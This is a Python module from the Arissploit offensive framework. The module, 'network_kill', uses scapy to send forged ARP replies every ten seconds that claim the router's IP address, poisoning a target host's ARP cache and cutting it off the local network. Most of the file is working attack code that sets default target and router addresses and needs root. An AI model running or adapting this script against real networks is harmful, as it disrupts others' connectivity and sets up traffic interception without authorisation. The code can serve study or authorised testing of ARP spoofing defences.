#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
import os
import signal
from time import sleep
import logging
from scapy.all import *
from core import colors

conf = {
	"name": "network_kill",
	"version": "1.0",
	"shortdesc": "Network targets killer.",
	"author": "Entynetproject",
	"initdate": "24.2.2019",
	"lastmod": "29.12.2019",
	"apisupport": False,
	"needroot": 1
}

# List of variables
variables = OrderedDict((
	('target', ['192.168.1.2', "Target IP address."]),
	('router', ['192.168.1.1', "Router IP address."]),
))

# Additional help notes
help_notes = colors.red+"This module will not work without root permission!\n This doesn't work if target refuses from arp request!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("ARP poisoning has been started...")
	printInform("Ctrl-C to stop.")
	packet = ARP()
	packet.psrc = variables['router'][0]
	packet.pdst = variables['target'][0]
	while 1:
		send(packet, verbose=False)
		sleep(10)
